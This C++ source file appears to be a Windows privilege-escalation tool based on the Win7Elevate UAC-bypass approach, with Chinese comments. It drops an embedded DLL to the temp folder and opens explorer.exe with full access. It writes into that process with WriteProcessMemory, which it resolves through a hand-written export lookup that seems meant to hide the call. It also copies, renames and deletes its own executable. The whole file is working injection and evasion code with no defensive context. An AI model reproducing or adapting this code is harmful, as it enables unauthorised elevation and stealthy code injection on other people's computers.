// elevate.cpp : Defines the entry point for the console application.
//

//#include "stdafx.h"
#include "elevate.h"
#include "tlhelp32.h"
#include "Win7Elevate_Inject.h"
#include <stdio.h>
#include "macro.h"
#include "Inject.h"

DWORD MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	int i=0;
	char *pRet = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = NULL;
	PIMAGE_NT_HEADERS pImageNtHeader = NULL;
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	pImageDosHeader=(PIMAGE_DOS_HEADER)hModule;
	pImageNtHeader=(PIMAGE_NT_HEADERS)((DWORD)hModule+pImageDosHeader->e_lfanew);
	pImageExportDirectory=(PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule+pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD dwExportRVA = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD dwExportSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	DWORD *pAddressOfFunction = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
	DWORD *pAddressOfNames = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
	DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory->NumberOfNames);
	DWORD dwBase = (DWORD)(pImageExportDirectory->Base);

	WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);

	//这个是查一下是按照什么方式（函数名称or函数序号）来查函数地址的
	DWORD dwName = (DWORD)lpProcName;
	if ((dwName & 0xFFFF0000) == 0)
	{
	goto xuhao;
	}

	for (i=0; i<(int)dwNumberOfNames; i++)
	{
	char *strFunction = (char *)(pAddressOfNames[i] + (DWORD)hModule);
	if (strcmp(strFunction, (char *)lpProcName) == 0)
	{
	  pRet = (char *)(pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
	  goto _exit11;
	}
	}
	//这个是通过以序号的方式来查函数地址的
	xuhao:
	if (dwName < dwBase || dwName > dwBase + pImageExportDirectory->NumberOfFunctions - 1)
	{
	return 0;
	}
	pRet = (char *)(pAddressOfFunction[dwName - dwBase] + (DWORD)hModule);
	_exit11:
	   //判断得到的地址有没有越界
	if ((DWORD)pRet<dwExportRVA+(DWORD)hModule || (DWORD)pRet > dwExportRVA+ (DWORD)hModule + dwExportSize)
	{
	 return (DWORD)pRet;
	}
	char pTempDll[100] = {0};
	char pTempFuction[100] = {0};
	strcpy(pTempDll, pRet);
	char *p = strchr(pTempDll, '.');
	if (!p)
	{
	return (DWORD)pRet;
	}
	*p = 0;
	strcpy(pTempFuction, p+1);
	strcat(pTempDll, ".dll");
	HMODULE h = GetModuleHandleA(pTempDll);
	if (h == NULL)
	{
	return (DWORD)pRet;
	}
	return MyGetProcAddress(h, pTempFuction);
}

CRemoteMemory::CRemoteMemory(HANDLE hRemoteProcess)
: m_hRemoteProcess(hRemoteProcess), m_bAnyFailures(false)
{
}

// virtual
CRemoteMemory::~CRemoteMemory()
{
}

void CRemoteMemory::LeakMemory()
{
}

bool CRemoteMemory::AnyFailures() const
{
	return m_bAnyFailures;
}

void *CRemoteMemory::AllocAndCopyMemory(const void *pLocalBuffer, SIZE_T bufferSize, bool bExecutable, bool bConst)
{
	void *pRemoteAllocation = VirtualAllocEx(m_hRemoteProcess, 0, bufferSize, MEM_COMMIT | PAGE_READWRITE, bExecutable ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE);

	if (pRemoteAllocation)
	{
		DWORD dwOldProtect = 0;
		DWORD dwWrite = 0;
		typedef int (*myfnWPM)(HANDLE, LPVOID, LPCVOID, signed int, SIZE_T*);

		HMODULE v1 = GetModuleHandleA("kernel32.dll");
		int v2 = MyGetProcAddress(v1, "WriteProcessMemory");
 
		//if(WriteProcessMemory(m_hRemoteProcess, pRemoteAllocation, pLocalBuffer, bufferSize, &dwWrite) == 0
		if(((myfnWPM)v2)(m_hRemoteProcess, pRemoteAllocation, pLocalBuffer, bufferSize, &dwWrite) == 0
		||	(!bExecutable && !bConst && !VirtualProtectEx(m_hRemoteProcess, pRemoteAllocation, bufferSize, bExecutable ? PAGE_EXECUTE_READ : PAGE_READONLY, &dwOldProtect)))
		{
			VirtualFreeEx(m_hRemoteProcess, pRemoteAllocation, 0, MEM_RELEASE);
			pRemoteAllocation = 0;
		}
		//KDebug("WriteProcessMemory %d\n", dwWrite);
	}

	if (pRemoteAllocation == 0)
	{
		m_bAnyFailures = true;
	}

	return pRemoteAllocation;
}

wchar_t *CRemoteMemory::AllocAndCopyMemory(const wchar_t *szLocalString, bool bConst)
{
	return reinterpret_cast< wchar_t * >(
		this->AllocAndCopyMemory(
			reinterpret_cast< const void * >( szLocalString ),
			(wcslen(szLocalString)+1) * sizeof(szLocalString[0]),
			false, bConst ) );
}

char *CRemoteMemory::AllocAndCopyMemory(const char *szLocalString, bool bConst)
{
	return reinterpret_cast< char * >(
		this->AllocAndCopyMemory(
			reinterpret_cast< const void * >( szLocalString ),
			(strlen(szLocalString)+1) * sizeof(szLocalString[0]),
			false, bConst ) );
}

bool OpenProcessToInject(HANDLE *pOutProcHandle, DWORD dwPid, const wchar_t *szProcName)
{
	*pOutProcHandle = 0;

	if (szProcName == NULL)
	{
		return false;
	}

	*pOutProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	if (*pOutProcHandle == 0)
	{
		return false;
	}

	return true;
}

static DWORD FindOneProcess(wchar_t *process)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if(hSnapshot == INVALID_HANDLE_VALUE)
		return -1;

	bool bFirst = true;
	PROCESSENTRY32 pe;
	ZeroMemory(&pe, sizeof(pe));
	pe.dwSize = sizeof(pe);

	BOOL bPR = Process32First(hSnapshot, &pe);

	while(bPR)
	{
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		if (hProc != 0)
		{
			CloseHandle(hProc);
		}

		if(wcscmp(pe.szExeFile, process) == 0)
			return  pe.th32ProcessID;

		bPR = Process32Next(hSnapshot, &pe);
	}

	return -1;
}

static bool ReleaseDllToTemp(wchar_t* dllPath)
{
	wchar_t szTempPath[MAX_PATH];
	DWORD dwTemp = GetTempPathW(_countof(szTempPath), szTempPath);
	if (dwTemp == 0 || dwTemp >= _countof(szTempPath))
		return false;

	union client_cfg cfg;
	char selfFileName[MAX_PATH] = {0};
	do
	{
#if 0		
		if(GetModuleFileNameA(NULL, selfFileName, MAX_PATH) == 0)
			break;
#else
		strcpy(selfFileName, "ject.exe");
#endif
		
		FILE* fp = fopen(selfFileName, "rb");
		if(fp == NULL)	break;
		
		if(fseek(fp , 0 - sizeof(cfg) , SEEK_END))
		{
			fclose(fp);
			break;
		}
		
		fread(&cfg, sizeof(cfg) , 1, fp);
		fclose(fp);

		if(memcmp(&cfg, CFG_MAGIC, 8) != 0)
		{
			break;
		}
	}while(0);

	unsigned char* dllBuf = new unsigned char[Inject_size];
	if(GetInjectResouceData(dllBuf, Inject_size, Inject_source, sizeof(Inject_source)) != 0)
	{
		delete []dllBuf;
		return false;
	}

	wchar_t szTempFilePath[MAX_PATH];
	if (0 == GetTempFileNameW(szTempPath, L"dll", 0, szTempFilePath))
		return false;

	HANDLE hFile = CreateFileW(szTempFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
		return false;

	DWORD nWritten = 0;
	if (WriteFile(hFile, dllBuf, Inject_size, &nWritten, NULL) == FALSE  || nWritten != Inject_size)
		return false;

	if (WriteFile(hFile, &cfg, sizeof(cfg), &nWritten, NULL) == FALSE  || nWritten != sizeof(cfg))
		return false;


	wcscpy(dllPath, szTempFilePath);	
	delete []dllBuf;
	CloseHandle(hFile);

	return true;
}

int main(int argc, char* argv[])
{
	
	if(argc == 1)
	{
		wchar_t szCmd[MAX_PATH] = {0};
		wchar_t szDir[MAX_PATH] = {0};
		wchar_t szPathToSelf[MAX_PATH] = {0};
		wchar_t* myProcess = L"explorer.exe";
		wchar_t strOurDllPath[MAX_PATH] = {0};

		CopyFileA(argv[0], "ject.exe", FALSE);
		MoveFileA(argv[0], "2ject.exe");
		
		GetSystemDirectoryW(szDir, sizeof(szDir));
		GetSystemDirectoryW(szCmd, sizeof(szCmd));
		wcscat(szCmd, L"\\cmd.exe");

		DWORD dwGMFN = GetModuleFileNameW(NULL, szPathToSelf, _countof(szPathToSelf));

		DWORD pidnumber = FindOneProcess(myProcess);
		if(pidnumber == -1)
			return -1;

		if (!ReleaseDllToTemp(strOurDllPath))
			return -1;

		
		AttemptOperation( true, true, pidnumber, myProcess, szCmd, L"", szDir, strOurDllPath);

		{
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;
			SECURITY_ATTRIBUTES sa;

			sa.nLength = sizeof(sa);
			sa.lpSecurityDescriptor = NULL;
			sa.bInheritHandle = TRUE;
			CreateFileA("ject.exe", 0, FILE_SHARE_READ, &sa, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);

			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));		
			CreateProcessA(NULL, "ject.exe fk", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		}

		return 0;
	}
	else 
	{
		while(!DeleteFileA("2ject.exe")) ;

		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		CreateProcessA(NULL, "net", NULL, NULL, TRUE, DEBUG_ONLY_THIS_PROCESS,  NULL, NULL, &si, &pi);
		return 0;
	}
}
